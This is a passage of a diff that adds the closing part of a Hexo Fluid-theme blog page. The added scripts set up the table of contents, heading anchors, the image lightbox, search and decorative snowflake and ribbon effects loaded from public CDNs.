+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
